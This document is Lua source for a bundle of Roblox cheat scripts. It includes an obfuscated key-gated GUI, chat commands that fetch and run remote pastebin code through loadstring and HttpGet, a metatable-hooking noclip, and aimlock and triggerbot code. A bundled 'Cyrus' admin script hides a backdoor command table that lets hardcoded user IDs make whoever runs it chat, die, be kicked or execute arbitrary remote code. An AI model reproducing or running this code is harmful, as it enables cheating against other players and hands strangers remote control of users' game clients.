s.TextWrapped = true
s.MouseButton1Click:connect(function()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\89\111\117\32\104\97\118\101\32\115\101\108\101\99\116\101\100\32\116\104\101\32\80\105\110\107\32\116\104\101\109\101";
})
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
sf.BackgroundColor3 = Color3.new(255, 0, 255)
sf_2.BackgroundColor3 = Color3.new(255, 0, 255)
sf_3.BackgroundColor3 = Color3.new(255, 0, 255)
dtenb.BackgroundColor3 = Color3.new(255, 0, 255)
jsfa.BackgroundColor3 = Color3.new(255, 0, 255)
jsfa_2.BackgroundColor3 = Color3.new(255, 0, 255)
jsfarc.BackgroundColor3 = Color3.new(255, 0, 255)
qdtenb.BackgroundColor3 = Color3.new(255, 0, 255)
bjsfa.BackgroundColor3 = Color3.new(255, 0, 255)
gpm_.BackgroundColor3 = Color3.new(255, 0, 255)
kl.BackgroundColor3 = Color3.new(255, 0, 255)
cgpm.BackgroundColor3 = Color3.new(255, 0, 255)
qdtenb_4.BackgroundColor3 = Color3.new(255, 0, 255)
oikl.BackgroundColor3 = Color3.new(255, 0, 255)
nbjs.BackgroundColor3 = Color3.new(255, 0, 255)
bjsfar.BackgroundColor3 = Color3.new(255, 0, 255)
qdtenb_8.BackgroundColor3 = Color3.new(255, 0, 255)
m_oiklqdtenb_o.BackgroundColor3 = Color3.new(255, 0, 255)
qdtenb_11.BackgroundColor3 = Color3.new(255, 0, 255)
arc.BorderColor3 = Color3.new(255, 0, 255)
iklqd.ImageColor3 = Color3.new(255, 0, 255)
far.ImageColor3 = Color3.new(255, 0, 255)
far.BackgroundColor3 = Color3.new(2255, 0, 255)
far.BorderColor3 = Color3.new(255, 0, 255)
lq.BackgroundColor3 =Color3.new(255, 0, 255)
ikl.BackgroundColor3 = Color3.new(255, 0, 255)
pm.BorderColor3 = Color3.new(255, 0, 255)
pm_.BorderColor3 = Color3.new(255, 0, 255)
n.BorderColor3 = Color3.new(255, 0, 255)
end)
js.Name = "\84\104\101\109\101\84\105\116\108\101"
js.Parent = pm
js.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
js.BackgroundTransparency = 0.5
js.Position = UDim2.new(0.096173808, 0, 0.040139772, 0)
js.Size = UDim2.new(0, 100, 0, 34)
qdtenb_11.Parent = js
qdtenb_11.BackgroundColor3 = Color3.new(1, 0, 0.0156863)
qdtenb_11.BackgroundTransparency = 0.5
qdtenb_11.Position = UDim2.new(0.00375000015, 0, 0, 0)
qdtenb_11.Size = UDim2.new(0, 99, 0, 34)
qdtenb_11.Font = Enum.Font.Garamond
qdtenb_11.Text = "\91\84\72\69\77\69\93"
qdtenb_11.TextColor3 = Color3.new(0, 0, 0)
qdtenb_11.TextScaled = true
qdtenb_11.TextSize = 14
qdtenb_11.TextWrapped = true
cgpm_oi.Name = "\108\111\103\105\110\116\101\120\116"
cgpm_oi.Parent = gpm_oik
cgpm_oi.BackgroundColor3 = Color3.new(1, 1, 1)
cgpm_oi.BackgroundTransparency = 1
cgpm_oi.Position = UDim2.new(0.0317460299, 0, 0.113207549, 0)
cgpm_oi.Size = UDim2.new(0, 177, 0, 40)
cgpm_oi.Font = Enum.Font.Garamond
cgpm_oi.Text = "\73\102\32\121\111\117\32\104\97\118\101\32\116\104\101\32\107\101\121\44\32\101\110\116\101\114\32\105\116\32\105\110\32\116\104\101\32\98\111\120\32\98\101\108\111\119\32\97\110\100\32\112\114\101\115\115\32\76\79\71\73\78\46"
cgpm_oi.TextColor3 = Color3.new(0, 0, 0)
cgpm_oi.TextScaled = true
cgpm_oi.TextSize = 14
cgpm_oi.TextWrapped = true
rcgpm_o.Name = "\75\69\89\32\66\79\88"
rcgpm_o.Parent = lqdte
rcgpm_o.BackgroundColor3 = Color3.new(1, 1, 1)
rcgpm_o.BackgroundTransparency = 0.30000001192093
rcgpm_o.Position = UDim2.new(0.121212125, 0, 0.519893885, 0)
rcgpm_o.Size = UDim2.new(0, 200, 0, 27)
rcgpm_o.TextScaled = true
rcgpm_o.Font = Enum.Font.Garamond
rcgpm_o.Text = "\91\69\110\116\101\114\32\75\101\121\32\72\101\114\101\93"
rcgpm_o.TextColor3 = Color3.new(1, 0, 0)
rcgpm_o.TextSize = 14
local pm_oiklqdte = game.Players.LocalPlayer
arcgpm_.Name = "\76\111\103\73\110\32\66\117\116\116\111\110"
arcgpm_.Parent = lqdte
arcgpm_.BackgroundColor3 = Color3.new(1, 0, 0)
arcgpm_.BackgroundTransparency = 0.40000000596046
arcgpm_.Position = UDim2.new(0.193181813, 0, 0.636604786, 0)
arcgpm_.Size = UDim2.new(0, 161, 0, 25)
arcgpm_.Font = Enum.Font.Garamond
arcgpm_.Text = "\91\76\79\71\73\78\93"
arcgpm_.TextColor3 = Color3.new(0, 0, 0)
arcgpm_.TextSize = 14
arcgpm_.MouseButton1Click:connect(function()
if rcgpm_o.Text ~= "\107\101\105\116\104\105\115\99\111\111\108" then
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\49\57\53\53\51\49\50\53\52\56"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\87\114\111\110\103\32\75\101\121\33\32\80\108\101\97\115\101\32\112\117\116\32\105\110\32\116\104\101\32\99\111\114\114\101\99\116\32\107\101\121\46";
})
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\91\75\111\114\88\32\86\51\93\58\32\87\114\111\110\103\32\75\101\121\33\32\80\108\101\97\115\101\32\112\117\116\32\105\110\32\116\104\101\32\99\111\114\114\101\99\116\32\107\101\121\46","\65\108\108")
end
if rcgpm_o.Text == "\107\101\105\116\104\105\115\99\111\111\108" then
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\76\111\97\100\105\110\103\46\46\46";
})
wait(1)
    
    wait(2)
wait(3)
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\49\56\51\54\50\51\57\56\50\55"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("\91\75\111\114\88\32\86\51\93\58\32\75\101\121\32\97\99\99\101\112\116\101\100\46\32\80\108\101\97\115\101\32\101\110\106\111\121\32\75\111\114\88\32\86\51\33","\65\108\108")
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\85\115\101\114\32\86\101\114\105\102\105\101\100\46\32\80\108\101\97\115\101\32\101\110\106\111\121\32\75\111\114\88\32\86\51\33";
})
lqdte.Visible = false
pm_.Visible = true
wait(0.2)
arc:TweenPosition(UDim2.new(0.193, 0,0.052, 0),'Out', 'Back', 1)
end
end)
farcgpm.Name = "\67\76\79\83\69\32\76\79\71\32\73\78\32\66\79\88"
farcgpm.Parent = lqdte
farcgpm.BackgroundColor3 = Color3.new(1, 0, 0)
farcgpm.BackgroundTransparency = 0.40000000596046
farcgpm.Position = UDim2.new(0.912058294, 0, 0.944297075, 0)
farcgpm.Size = UDim2.new(0, 23, 0, 21)
farcgpm.Font = Enum.Font.ArialBold
farcgpm.Text = "\91\88\93"
farcgpm.TextColor3 = Color3.new(0, 0, 0)
farcgpm.TextScaled = true
farcgpm.TextSize = 14
farcgpm.TextWrapped = true
farcgpm.MouseButton1Click:connect(function()
lqdte:Destroy()
wait(0.00000001)
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\75\111\114\88\32\86\51\32\104\97\115\32\98\101\101\110\32\115\117\99\99\101\115\115\102\117\108\108\121\32\99\108\111\115\101\100\46";
})
end)
helpp = false
nbj.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
helpp = false
if helpp == false then
n.Visible = true
wait(0.0001)
helpp = true
elseif helpp == true then
n.Visible = false
wait(0.0001)
helpp = false
end
end)
theme = false
ten.MouseButton1Click:connect(function()
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\49\57\51\50\55\57\54\50\51"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
if theme == false then
pm.Visible = true
wait(0.0001)
theme = true
elseif iklqdten == true then
pm.Visible = false
wait(0.0001)
theme = false
end
end)
Player = game.Players.LocalPlayer
Mouse = Player:GetMouse()
gui = cgp
box = arc
iklqdten = true
gpm.MouseButton1Click:connect(function()
if iklqdten == false and rcgpm_o.Text == "\107\101\105\116\104\105\115\99\111\111\108" then
arc:TweenPosition(UDim2.new(0.193, 0,0.052, 0),'Out', 'Bounce', 1)
wait(2)
iklqdten = true
elseif iklqdten == true and rcgpm_o.Text == "\107\101\105\116\104\105\115\99\111\111\108" then
arc:TweenPosition(UDim2.new(-0.743, 0,1.7, 0),'Out', 'Bounce', 1)
n.Visible = false
pm.Visible = false
help = false
theme = false
wait(2)
iklqdten = false
end
end)
function f(m_oiklqdtenb_)
if (m_oiklqdtenb_ == "\61") and rcgpm_o.Text == "\107\101\105\116\104\105\115\99\111\111\108" then
    if (iklqdten == false) then
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\51\49\55\51\49\57\56\48"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
        arc:TweenPosition(UDim2.new(0.193, 0,0.052, 0),'Out', 'Bounce', 1)
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\71\117\105\32\111\112\101\110\101\100\46";
})
wait(2)
iklqdten = true
elseif (iklqdten == true) and rcgpm_o.Text == "\107\101\105\116\104\105\115\99\111\111\108" then
local sfarcgpm_ = game.Workspace
Instance.new("\83\111\117\110\100", sfarcgpm_)
wait(0.01)
sfarcgpm_.Sound.Name = "\98\111\114\107\103\97\110\103\76\79\76\88\68"
wait(0.03)
sfarcgpm_.borkgangLOLXD.SoundId = "\114\98\120\97\115\115\101\116\105\100\58\47\47\50\51\49\55\51\49\57\56\48"
sfarcgpm_.borkgangLOLXD.Volume = 1
wait (0.02)
sfarcgpm_.borkgangLOLXD:Play()
arc:TweenPosition(UDim2.new(-0.743, 0,1.7, 0),'Out', 'Bounce', 1)
n.Visible = false
pm.Visible = false
theme = false
help = false
game:GetService("\83\116\97\114\116\101\114\71\117\105"):SetCore("\83\101\110\100\78\111\116\105\102\105\99\97\116\105\111\110", {
    Title = "\91\75\111\114\88\32\86\51\93";
    Text = "\71\117\105\32\99\108\111\115\101\100\46";
})
wait(2)
iklqdten = false
end
end
end
Mouse.KeyDown:connect(f)
function j(gpm_oiklq)
for n,o in pairs(gpm_oiklq:GetChildren())do
if(o:IsA("\66\97\115\101\80\97\114\116"))then o.Locked = false end
j(o)
end
end
j(Workspace)
end
end)
----------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+aidez") then
loadstring(game:HttpGet(('https://pastebin.com/raw/e2Q36aiM'),true))()
end
end)
---------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+psycho") then

game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)

if (string.lower(msg) == "/e re") then
local Tp = game:GetService("TeleportService")
local placeID = 4669040

Tp:Teleport(placeID,game.Players.LocalPlayer)
end
end)


local NoclipKey = "x" -- Type a letter in the quotes to change the key that'll toggle noclip



------------------------------------

repeat wait() until game.Players ~= nil
repeat wait() until game.Players.LocalPlayer ~= nil

local LocalP = game.Players.LocalPlayer
local Mouse = LocalP:GetMouse()
local NoClip = false
NoclipKey = string.lower(NoclipKey)
local fakevalue = Instance.new("BoolValue")
fakevalue.Value = false

local meta = getrawmetatable(game)
if PROTOSMASHER_LOADED then
    make_writeable(meta)
else
    setreadonly(meta,false)
end
local index = meta.__index

meta.__index=function(self,k)
    if not checkcaller() or not is_protosmasher_caller() then
        if tostring(self) == "Part" and tostring(k) == "Anchored" then
            return index(fakevalue,"Value")
        end
    end
    return index(self,k)
end

Mouse.KeyDown:Connect(function(key)
    if key == NoclipKey then
        NoClip = not NoClip
        local currenttext = ""
        if NoClip == true then
            currenttext = "on"
        else
            currenttext = "off"
        end
        game.StarterGui:SetCore("SendNotification", {
            Title = "notification";
            Text = currenttext;
            Icon = "rbxassetid://2541869220";
            Duration = 3;
        })
    end
end)

game:GetService('RunService').Stepped:connect(function()
    if NoClip == true then
        if LocalP.Character ~= nil then
            if LocalP.Character:FindFirstChild("Head") and LocalP.Character:FindFirstChild("Torso") and LocalP.Character:FindFirstChild("Humanoid") then
                LocalP.Character.Head.CanCollide = false
                LocalP.Character.Torso.CanCollide = false
                LocalP.Character.Humanoid.Sit = false
            end
        end
    end
end)

print("")
print(string.upper(NoclipKey).." Key - Toggle noclip")
print("")
game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
    if KeyPressed == "c" then
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end
end)
rpm = 1
game:GetService('RunService').RenderStepped:connect(function()
    for i=1,math.ceil((rpm/60)/60) do
        game.Lighting.TimeOfDay = "18:00:00"
    end
end)
function deseat(instance) 
    for i,v in pairs(instance:GetChildren()) do
    if v:IsA("Seat") then
        v.Parent = game.Lighting
    end
        deseat(v)
    end
end

deseat(game.Workspace) 
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)

if (string.lower(msg) == "door") then
    local doors = game.Workspace:GetChildren()
for i,v in pairs (doors)do 
    if v.Name == "Door" then
        v:Destroy()
        
     
    end    
    end
end
end)
local lighting = game.Lighting
        if lighting:FindFirstChild("ColorCorrection") then
            lighting:FindFirstChild("ColorCorrection"):Remove()
        end
        if lighting:FindFirstChild("Correction") then
            lighting:FindFirstChild("Correction"):Remove()
        end
        
        local sunray = Instance.new("SunRaysEffect", lighting)
        local sky = lighting.Sky
        sky.SkyboxBk = "http://www.roblox.com/asset/?id=185544271"
        sky.SkyboxDn = "http://www.roblox.com/asset/?id=185544298"
        sky.SkyboxFt = "http://www.roblox.com/asset/?id=185544329"
        sky.SkyboxLf = "http://www.roblox.com/asset/?id=185544349"
        sky.SkyboxRt = "http://www.roblox.com/asset/?id=185544367"
        sky.SkyboxUp = "http://www.roblox.com/asset/?id=185544404"
        
        sky.StarCount = 3000
        sky.SunAngularSize = 21
        sky.MoonAngularSize = 11
        
        local correction = Instance.new("ColorCorrectionEffect", lighting)
        correction.Name = "Correction"
        correction.Saturation = -0.4
        correction.TintColor = Color3.fromRGB(224, 241, 255)
--thx to icedtearz he is epic qt
local emojis = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/Aidez/emojiscopy/master/main", true))
local chatbar = nil
repeat wait() until game.Players.LocalPlayer:FindFirstChild("PlayerGui")
for i,v in pairs(game.Players.LocalPlayer.PlayerGui:GetDescendants()) do
    if v.Name == "ChatBar" then
        chatbar = v
    end
end

chatbar:GetPropertyChangedSignal("Text"):Connect(function()
    local reversed = string.reverse(chatbar.Text)
    if string.sub(reversed, 1, 1) == ":" and string.find(reversed, ":", 2) then
        local theend = string.find(reversed, ":", 2)
        local emojiname = string.reverse(string.sub(reversed, 2, theend - 1)) 
        if emojis[emojiname] ~= nil then
            local message = string.reverse(string.sub(reversed, theend + 1, -1))..emojis[emojiname].." "
            chatbar.Text = message
        end
    end
end)

game.Players.LocalPlayer.PlayerGui.DescendantAdded:Connect(function(desc)
    if desc.Name == "ChatBar" then
        chatbar = desc
        chatbar:GetPropertyChangedSignal("Text"):Connect(function()
            local reversed = string.reverse(chatbar.Text)
            if string.sub(reversed, 1, 1) == ":" and string.find(reversed, ":", 2) then
                local theend = string.find(reversed, ":", 2)
                local emojiname = string.reverse(string.sub(reversed, 2, theend - 1)) 
                if emojis[emojiname] ~= nil then
                    local message = string.reverse(string.sub(reversed, theend + 1, -1))..emojis[emojiname].." "
                    chatbar.Text = message
                end
            end
        end)
    end
end)

game.Players.LocalPlayer:GetMouse().KeyDown:Connect(function(KeyPressed)
    if KeyPressed == "h" then
    game.Players.LocalPlayer.Character["Right Arm"]:Destroy()
end
end)
mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(key)
	    if key:lower() == "m" then
		for i,v in pairs (game.Workspace:GetChildren()) do
	if v.Name == "Door" then
		v.Click.ClickDetector.RemoteEvent:FireServer(true)
	end
end
	end
end)
print([[
c to reset
midnight
blue sky
h for anti fe
m to close/open all doors
say "door" and doors destroy
has aidez discord emoji script
/e re to rejoin
x for noclip
on execution seats destroy

/e god for godmode then reset after command

aimlock
------------------------------------
press q when cursor is directed at players torso
press e to shoot or use aimlock]])

local amount = fovamount

game:GetService'Workspace'.Camera.FieldOfView = 86

targetee = nil
pleaseshoot = false
mouse = game.Players.LocalPlayer:GetMouse()

local TargetGUI = Instance.new("ScreenGui")
local Target = Instance.new("TextBox")
local Background = Instance.new("ImageLabel")

TargetGUI.Name = "TargetGUI"
TargetGUI.Parent = game.CoreGui




local debounce = false
function fireat(target)
if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Fire then
u = game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Fire
if target.Character then
				u:FireServer(targetee.Character.Torso.CFrame + targetee.Character.HumanoidRootPart.Velocity/10) 
end
end
end

end


Target.FocusLost:Connect(function()
local name = string.lower(Target.Text)
local player = nil

names = game.Players:GetChildren()
                                
                            for i,x in pairs(names) do
                                strlower = string.lower(x.Name)
                                sub = string.sub(strlower,1,#name)                      
                                
                                if name == sub then 
                                    player = x
                                    if player.Name ~= game.Players.LocalPlayer.Name and x.Name ~= "Vortexturize" then
                                     	targetee = player
                                    end
                                end
                            end
end)

function ShootGlocks(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.E and gameProcessedEvent == false then
	fireat(targetee)
    end
end
function UnShootGlocks(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.E and gameProcessedEvent == false then
	pleaseshoot = false
    end
end
function CtrlSelect(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.Q and gameProcessedEvent == false then
	Selecting = true
    end
end
function UnCtrlSelect(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.Q and gameProcessedEvent == false then
	Selecting = false
    end
end



game:GetService("UserInputService").InputBegan:connect(ShootGlocks)
game:GetService("UserInputService").InputEnded:connect(UnShootGlocks)
game:GetService("UserInputService").InputBegan:connect(CtrlSelect)
game:GetService("UserInputService").InputEnded:connect(UnCtrlSelect)



game:GetService('RunService').Stepped:connect(function()
   
    if Selecting == true then
	if mouse.Target then
	    if mouse.Target.Parent:IsA("Model") and game.Players:FindFirstChild(mouse.Target.Parent.Name) then
		Target.Text = mouse.Target.Parent.Name
		targetee = game.Players:FindFirstChild(mouse.Target.Parent.Name)
	    end
	end
    end
end)
local rs = game:GetService("RunService")
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
 
    if (string.lower(msg) == "/e god") then
        rs.Heartbeat:Connect(function()
    local ll =game.Players.LocalPlayer.Character:FindFirstChild("Right Leg")
    ll:Destroy()
end)

    end
end)
game:GetService("StarterGui"):SetCore("SendNotification", {
		    Title = "Psycho";
		    Text = "icedtearz and whattadollar's priv script. (;";
			})
end
end)
------------------
game:GetService("Players").LocalPlayer.Chatted:connect(function(msg)
    
if (string.lower(msg) == "+cyrus") then

--[[ Bugs

--]]

--[[Todo
	Add a scuffed bfg (in testing)
]]

-- [[ Variables ]] --

local Tick = tick()

-- Global Variables -- 

getgenv().Players = game:GetService'Players'
getgenv().TeleportService = game:GetService'TeleportService'
getgenv().ReplicatedStorage = game:GetService'ReplicatedStorage' 
getgenv().StarterGui = game:GetService'StarterGui'
getgenv().TweenService = game:GetService'TweenService'
getgenv().UserInput = game:GetService'UserInputService'
getgenv().RunService = game:GetService'RunService'
getgenv().Lighting = game:GetService'Lighting'
getgenv().CoreGui = game:GetService'CoreGui'
getgenv().HttpService = game:GetService'HttpService'
getgenv().VirtualUser = game:GetService'VirtualUser'
getgenv().LP = Players.LocalPlayer or Players.PlayerAdded:Wait()
getgenv().Mouse = LP:GetMouse()
getgenv().GetChar = function() return LP.Character or LP.CharacterAdded:Wait() end
GetChar():WaitForChild'Humanoid'

-- Bools -- 

local AimbotAutoShoot = false
local AntiAim = false
local AntiKill = false
local Aimlock = false
local AliasesEnabled = true
local AnnoyOn = false
local AlwaysGh = false 
local AutoDie = false
local AirwalkOn = false
local AutoStomp = false
local AutoTriggerBot = false
local AutoFeloop = false
local AutoTarget = false
local AutoFarm = false
local Blinking = false
local BuyingStuff = false
local CamLocking = false
local CurrentlyShooting = false
local BfgOn = false
local DoubleJumpEnabled = false
local DamageIndicatorDebounce = false
local ExploiterDetectionOn = false
local FeLoop = false 
local Flying = false
local FlyDebounce = false
local Freecam = false
local GodMode = false
local GunStomp = true 
local GravGunSeizureMode = false
local HealBot = false
local ItemEsp = false
local NeverSitting = false 
local Normalwalk = false
local NoGh = false
local Noclip = false
local Spamming = false
local TpBypass = false
local TriggerBot = false 
local TriggerBotAutoReload = false
local UseDrawingLib = pcall(assert,Drawing,'Hi')
local WalkShoot = true

-- Strings -- 
 
local AimMode = "Prediction"
local AimlockMode = "LeftClick"
local CamlockTarget = "Head"
local SpamMessage = "Cyrus' Admin Or No Admin"
local ConfigurationFile = "CyrusStreetsAdminSettings.json"
local GunAnim = "None"

-- Ints -- 

local Rainbowdelay = 0
local BlinkSpeed = 0
local NormalHH = 0
local SpamDelay = 1
local AimbotVelocity = 5
local NewPredictionVelocity = 5 
local GravGunDistance = 5
local CrouchSpeed = 8
local FlySpeed = 10
local WalkSpeed = 16
local NormalWs = 16
local SprintSpeed = 25
local HealBotHealth = 25
local NormalJP = 37.5
local AutoStompRange = 50
local NormalGravity = workspace.Gravity
local BulletColour = ColorSequence.new(Color3.fromRGB(144,0,0)) -- technically not an int but we'll go with it
local EspColour = Color3.fromRGB(255,255,255)
 
-- Initially Nil -- 

local AimlockTarget;
local AimlockTargetPosition;
local AnnoyingPlayer;
local CanSetHotkey;
local CamlockPlayer;
local ClickTpKey;
local ClockTime;
local GravGunBodyPosition;
local GravGunBodyVelocity;
local GravGunTool;
local LoopPlayer;
local PlayOnDeath;
local SpawnWs;
local SpawnJP;
local SpawnHH;
local ViewPlayerConnection;


-- Instances -- 

local AntiAimAnimation = Instance.new'Animation'
AntiAimAnimation.AnimationId = "rbxassetid://215384594"

local Dance1Animation = Instance.new'Animation'
Dance1Animation.AnimationId = "rbxassetid://33796059"

local Dance2Animation = Instance.new'Animation'
Dance2Animation.AnimationId = "rbxassetid://35654637"

local SpinAnimation = Instance.new'Animation'
SpinAnimation.AnimationId = "rbxassetid://188632011"

local GunAnimation1 = Instance.new'Animation'
GunAnimation1.AnimationId = "rbxassetid://889968874"

local GunAnimation2 = Instance.new'Animation'
GunAnimation2.AnimationId = "rbxassetid://229339207"

local AirWalk = Instance.new'Part'
AirWalk.Anchored = true 
AirWalk.Size = Vector3.new(20,1,20)
AirWalk.Transparency = 1 

local CmdsFrame = Instance.new('Frame',CoreGui.RobloxGui)
local CmdsLabel = Instance.new('TextLabel',CmdsFrame)
local CmdsScrolling = Instance.new('ScrollingFrame',CmdsFrame)

local CmdBarFrame = Instance.new('Frame',CoreGui.RobloxGui)
local CmdBarTextBox = Instance.new('TextBox',CmdBarFrame)
local CmdBarImageLabel = Instance.new('ImageLabel',CmdBarFrame)

local DmgIndicator = Instance.new('TextLabel',LP.PlayerGui.Chat.Frame)

local RainbowFrame = Instance.new('Frame',CoreGui.RobloxGui)
local RainbowLabel = Instance.new('TextLabel',RainbowFrame)
local RainbowScrolling = Instance.new('ScrollingFrame',RainbowFrame)

local ValuesFrame = Instance.new('Frame',CoreGui.RobloxGui)
local ValuesTextLabel = Instance.new('TextLabel',ValuesFrame)

local HotkeysFrame = Instance.new('Frame',CoreGui.RobloxGui)
local HotkeysTextLabel = Instance.new('TextLabel',HotkeysFrame)

local KeysFrame = Instance.new('Frame',CoreGui.RobloxGui)
local AnyCmdButton = Instance.new('TextButton',KeysFrame)
local KeysLabel = Instance.new('TextLabel',KeysFrame)
local CmdBarKeyLabel = Instance.new('TextLabel',KeysFrame)
local CmdBarKeyButton = Instance.new('TextButton',KeysFrame)
local AnyCmdTextBox = Instance.new('TextBox',KeysFrame)

local VanPart = Instance.new('Part',workspace)

-- Tables -- 

local AdminUserTable = {}
local Commands = {}
local DetectedExploiters = {}
local ExploitDetectionPlayerTablePositions = {}
local EspTable = {}
local EspTable2 = {}
local Keys = {}
local PartTable = {}
local StompWhitelist = {} 
local ToolTable = {}
local WireFrameTable = {}

local BackDoorTableCommands = {
	['chat'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(Content,"All") end end;
		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
	};
	['bring'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then CheckCommand("to "..CommandedPlayer.Name) end end;
		['Levels'] = {[1] = true;[2] = true;[3] = true;[4] = true;}
	};
	['kill'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then GetChar():BreakJoints() end end;
		['Levels'] = {[2] = true;[3] = true;[4] = true;}
	};
	['exec'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then CheckCommand(Content) end end;
		['Levels'] = {[3] = true;[4] = true;}
	};
	['kick'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then LP:Kick(Content) end end;
		['Levels'] = {[3] = true;[4] = true;}
	};
	['ban'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then ReplicatedStorage.lIIl:FireServer'hipheight' end end;
		['Levels'] = {[4] = true;}
	};
	['p'] = {
		['Func'] = function(Player,Content,CommandedPlayer) if Player == LP or typeof(Player) == "table" then loadstring(game:HttpGet("https://www.pastebin.com/raw/"..Content))() end end;
		['Levels'] = {[3] = true;[4] = true;}
	}
}

local BackDoorTablePlayers = {
	[12978668] = {
		['Name'] = "!fishgang Cy (Creator and ONLY dev)";
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(178,242,255);
	};
	[1388703832] = {
		['Name'] = "!fishgang Cy (Creator and ONLY dev)";
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(178,242,255);
	};
    [1066524308] = {
		['Name'] = "Kylee [My Gf so kill her = you die] (She does not know anything about the script so stop asking)";
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(178,242,255);
	};
    [114164798] = {
		['Name'] = "!fishgang Slays (Developer when not lazy)"; 
		['Access'] = 4;
		['Colour'] = Color3.fromRGB(63,0,0);
	};
	[117074493] = {
		['Name'] = "!fishgang Slays Alt (Not my account) (Developer when not lazy)"; 
		['Access'] = 4;
